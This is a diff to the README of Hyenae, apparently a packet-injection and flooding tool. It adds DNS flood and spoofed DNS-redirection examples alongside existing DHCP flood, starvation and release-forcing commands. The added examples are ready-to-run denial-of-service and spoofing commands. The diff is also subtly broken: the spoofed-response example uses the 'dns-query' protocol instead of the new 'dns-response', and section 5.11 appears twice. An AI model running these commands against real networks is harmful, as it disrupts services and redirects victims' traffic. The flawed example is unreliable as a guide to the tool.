@@ -76,10 +76,12 @@
     > icmp-unreach-tcp
     > tcp
     > udp
+    > dns-query
+    > dns-response
     > dhcp-discover
     > dhcp-request
     > dhcp-release
-  * Finished: 9 attack protocols available
+  * Finished: 11 attack protocols available
 
   You can provide the attack protocol by its name (-a). The attack protocols
   use different address patterns and in certain cases, may require additional
@@ -179,7 +181,24 @@
 
     # hyenae -I 3 -a udp -s %-%@%%%% -d 00:f0:21:03:c6:00-192.168.0.1@130 -p 100
 
-    5.10 DHCP-Discover Flood
+    5.10 DNS-Flood
+
+    This example will send an unlimited amount of DNS query packets from a
+    random source to an existing DNS server.
+
+    # hyenae -I 3 -a dns-query -s %-% -d 00:f0:21:03:c6:00-192.168.0.1 \
+    # -y www.google.com
+
+    5.11 Spoofed DNS-Redirection
+
+    This example will send an unlimited amount of DNS response packets from
+    an existing source to an existing DNS server.
+
+    # hyenae -I 3 -a dns-query -s 00:f0:21:03:c6:00-192.168.0.2 \
+    # -d 00:f0:21:03:c6:00-192.168.0.1 -y www.google.com \
+    # -Y www.google.de@192.168.0.3
+
+    5.11 DHCP-Discover Flood
 
     This example will send an unlimited amount of DHCP-Discover packets from a
     random source to all available machines on the network. The second example
@@ -191,7 +210,7 @@
     # hyenae -I 3 -a dhcp-discover -s %-0.0.0.0 \
     # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -S 192.168.%.%%
 
-    5.11 DHCP-Starvation Attack
+    5.12 DHCP-Starvation Attack
 
     This example will send an unlimited amount of DHCP-Request packets from a
     random source to all available machines on the network. The DHCP-Option
@@ -205,7 +224,7 @@
     # hyenae -I 3 -a dhcp-request -s %-0.0.0.0 \
     # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -S % -D 192.168.0.1
 
-    5.12 DHCP-Release Forcing
+    5.13 DHCP-Release Forcing
 
     This example will send a single DHCP-Release packet from a fictional source
     address to a fictional DHCP-Server. The DHCP-Option "Server Identifier" is
@@ -261,7 +280,7 @@
   * Starting daemon
   * Opening network interface (en1)
   * Binding server to 192.168.0.2@666
-  * Hyenae Daemon v0.31-1: Online
+  * Hyenae Daemon v0.32-1: Online
 
 --------------------------------------------------------------------------------
 
